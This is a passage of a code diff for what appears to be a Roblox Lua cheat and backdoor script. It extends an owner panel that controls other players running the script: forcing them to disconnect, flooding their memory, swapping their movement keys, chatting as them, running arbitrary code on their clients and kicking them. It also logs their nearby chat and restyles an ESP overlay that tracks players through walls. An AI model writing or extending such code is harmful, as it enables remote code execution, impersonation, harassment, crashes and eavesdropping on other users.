+                cmd(uid, "swap_ws")
+            end)
+            wsBtn.Text = "W/S: " .. (T.ws and "ON" or "OFF")
+
+            local adBtn = pb("A/D: OFF", 228, 108, 110, function(self)
+                T.ad = not T.ad
+                self.Text = "A/D: " .. (T.ad and "ON" or "OFF")
+                cmd(uid, "swap_ad")
+            end)
+            adBtn.Text = "A/D: " .. (T.ad and "ON" or "OFF")
+
+            -- row 6: mute / anti-unfreeze / reapply
+            local muteBtn = pb("Mute: OFF", 0, 134, 110, function(self)
+                T.mute = not T.mute
+                self.Text = "Mute: " .. (T.mute and "ON" or "OFF")
+                cmd(uid, "mute")
+            end)
+            muteBtn.Text = "Mute: " .. (T.mute and "ON" or "OFF")
+
+            local antiBtn = pb("Anti-Frz: OFF", 114, 134, 110, function(self)
+                T.anti = not T.anti
+                self.Text = "Anti-Frz: " .. (T.anti and "ON" or "OFF")
+                cmd(uid, "anti_unfreeze")
+            end)
+            antiBtn.Text = "Anti-Frz: " .. (T.anti and "ON" or "OFF")
+
+            local reapBtn = pb("ReApply: OFF", 228, 134, 110, function(self)
+                T.reap = not T.reap
+                self.Text = "ReApply: " .. (T.reap and "ON" or "OFF")
+                cmd(uid, "reapply")
+            end)
+            reapBtn.Text = "ReApply: " .. (T.reap and "ON" or "OFF")
+
+            -- row 7: destructive
+            pb("Force DC", 0, 160, 110, function() cmd(uid, "disconnect") end)
+            pb("Mem Lite", 114, 160, 110, function() cmd(uid, "mems_spray_lite") end)
+            pb("Mem Full", 228, 160, 110, function() cmd(uid, "mem_spray_full") end)
+
+            -- row 8: emote input + emote
+            local emoteIn = makeInput(panel, "emote id...", 0, 188, 234, 22)
+            pb("Emote", 238, 188, 100, function() cmd(uid, "emote", emoteIn.Text) end)
+
+            -- row 9: image input + show
+            local imgIn = makeInput(panel, "decal id...", 0, 214, 234, 22)
+            pb("Show Img", 238, 214, 100, function() cmd(uid, "image", imgIn.Text) end)
+
+            -- row 10: msg
+            local msgIn = makeInput(panel, "message...", 0, 240, 234, 22)
+            pb("Send Msg", 238, 240, 100, function() cmd(uid, "message", msgIn.Text) end)
+
+            -- row 11: force chat
+            local chatIn = makeInput(panel, "chat as them...", 0, 266, 234, 22)
+            pb("Chat", 238, 266, 100, function() cmd(uid, "chat", chatIn.Text) end)
+
+            -- row 12: code
+            local codeIn = makeInput(panel, 'print("hi")', 0, 296, 338, 44)
             codeIn.Font = Enum.Font.Code
-            pb("Run Code", 0, 194, 334, 24, function() cmd(uid, "code", codeIn.Text) end)
+            pb("Run Code", 0, 344, 338, 22, function() cmd(uid, "code", codeIn.Text) end)
 
-            makeLabel(panel, "kick message:", 0, 224, 200, 14, 10)
-            local kickIn = makeInput(panel, "jump if u want to get banned", 0, 240, 334, 24)
-            pb("Kick", 0, 268, 334, 24, function() cmd(uid, "kick", kickIn.Text) end)
+            -- row 13: kick
+            makeLabel(panel, "kick message:", 0, 374, 200, 14, 10)
+            local kickIn = makeInput(panel, "jump if u want to get banned", 0, 390, 338, 22)
+            pb("Kick", 0, 416, 338, 22, function() cmd(uid, "kick", kickIn.Text) end)
+
+            -- row 14: chat log
+            makeLabel(panel, "nearby chat (50 studs):", 0, 446, 300, 14, 10)
+            local chatLogLbl = makeLabel(panel, "", 0, 462, 338, 230, 10, Color3.fromRGB(255, 140, 220))
+            chatLogLbl.TextWrapped = true
+            chatLogLbl.TextYAlignment = Enum.TextYAlignment.Top
+            chatLogLbl.Font = Enum.Font.Code
+            ref.chatLogLbl = chatLogLbl
         end
 
         expandBtn.MouseButton1Click:Connect(function()
@@ -652,6 +1019,7 @@ if IS_OWNER then
                     other.card.Size = UDim2.new(1, -8, 0, 66)
                     other.joinBtn.Visible = false
                     other.expandBtn.Text = "v"
+                    other.chatLogLbl = nil
                 end
                 EXPANDED = uid
                 expand()
@@ -677,7 +1045,6 @@ if IS_OWNER then
         end
         table.sort(sorted, function(a, b) return (a.user.ts or 0) > (b.user.ts or 0) end)
 
-        -- remove cards for gone users
         for uid, ref in pairs(CARD_REFS) do
             if not seen[uid] then
                 if ref.card and ref.card.Parent then ref.card:Destroy() end
@@ -686,7 +1053,6 @@ if IS_OWNER then
             end
         end
 
-        -- add / update cards
         for i, entry in ipairs(sorted) do
             local uid = entry.uid
             local user = entry.user
@@ -709,7 +1075,7 @@ if IS_OWNER then
                 empty.Size = UDim2.new(1, -8, 0, 30)
                 empty.BackgroundTransparency = 1
                 empty.Parent = scroll
-                makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(190, 170, 220))
+                makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(255, 130, 210))
             end
         else
             local empty = scroll:FindFirstChild("__emptyMsg")
@@ -743,6 +1109,22 @@ if IS_OWNER then
                 else
                     LAST_ERR = "read failed"
                 end
+                -- update chat logs in expanded panels
+                if st and st.chatlog then
+                    for uid, ref in pairs(CARD_REFS) do
+                        if ref.chatLogLbl then
+                            local log = st.chatlog[tostring(uid)] or {}
+                            local lines = {}
+                            for i = math.max(1, #log - 9), #log do
+                                local e = log[i]
+                                if e then
+                                    table.insert(lines, "[" .. tostring(e.dist) .. "m] " .. e.from .. ": " .. e.msg)
+                                end
+                            end
+                            ref.chatLogLbl.Text = #lines > 0 and table.concat(lines, "\n") or "(no nearby chat yet)"
+                        end
+                    end
+                end
             end)
             syncCards()
             task.wait(1.2)
@@ -762,7 +1144,7 @@ if IS_OWNER then
                 if on and ONLINE[uid] then
                     local u = ONLINE[uid]
                     if u.job and u.job ~= game.JobId then
-                        pcall(function() TeleportSvc:TeleportToPlaceInstance(u.place or game.PlaceId, u.job, LP) end)
+                        joinServer(u.place or game.PlaceId, u.job)
                     end
                 end
             end
@@ -965,10 +1347,11 @@ local function buildEsp(plr)
     local nameL = Instance.new("TextLabel")
     nameL.BackgroundTransparency = 1
     nameL.Size = UDim2.new(1, 0, 0, 16)
-    nameL.TextColor3 = Color3.fromRGB(245, 235, 255)
+    nameL.TextColor3 = Color3.fromRGB(255, 70, 190)
+    nameL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    nameL.TextStrokeTransparency = 0
     nameL.Font = Enum.Font.GothamBold
     nameL.TextSize = 12
-    nameL.TextStrokeTransparency = 0
     nameL.Text = plr.Name
     nameL.Parent = bill
     bucket.nameL = nameL
@@ -977,10 +1360,11 @@ local function buildEsp(plr)
     hpL.BackgroundTransparency = 1
     hpL.Size = UDim2.new(1, 0, 0, 14)
     hpL.Position = UDim2.new(0, 0, 0, 16)
-    hpL.TextColor3 = Color3.fromRGB(255, 190, 190)
-    hpL.Font = Enum.Font.Gotham
-    hpL.TextSize = 11
+    hpL.TextColor3 = Color3.fromRGB(255, 70, 190)
+    hpL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     hpL.TextStrokeTransparency = 0
+    hpL.Font = Enum.Font.GothamBold
+    hpL.TextSize = 11
     hpL.Text = "100"
     hpL.Parent = bill
     bucket.hpL = hpL
@@ -989,10 +1373,11 @@ local function buildEsp(plr)
     distL.BackgroundTransparency = 1
     distL.Size = UDim2.new(1, 0, 0, 14)
     distL.Position = UDim2.new(0, 0, 0, 30)
-    distL.TextColor3 = Color3.fromRGB(225, 215, 250)
-    distL.Font = Enum.Font.Gotham
-    distL.TextSize = 11
+    distL.TextColor3 = Color3.fromRGB(255, 70, 190)
+    distL.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
     distL.TextStrokeTransparency = 0
+    distL.Font = Enum.Font.GothamBold
+    distL.TextSize = 11
     distL.Text = "0m"
     distL.Parent = bill
     bucket.distL = distL
